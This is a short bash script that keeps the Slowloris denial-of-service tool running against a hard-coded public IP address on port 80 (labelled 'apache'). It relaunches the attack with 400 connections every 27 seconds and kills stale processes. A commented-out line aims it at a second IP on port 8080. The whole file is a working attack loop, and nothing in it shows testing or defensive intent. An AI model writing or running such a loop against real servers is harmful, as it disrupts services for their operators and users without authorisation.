#!/bin/bash

kill_later() {

	sleep 3;
	kill -9 $1

}

trap "killall perl; exit" SIGHUP SIGINT SIGTERM

while true; do 
	# seven
	# perl slowloris.pl -dns 200.237.249.161 -port 8080 -timeout 35 -num 400 -tcpto 4 & disown

	# apache
	perl slowloris.pl -dns 150.165.202.167 -port 80 -timeout 13 -num 400 -tcpto 4 & disown
	pid=$!;
	echo $pid;
	sleep 27;
	kill_later $pid & disown
	# kill -9 $pid
done
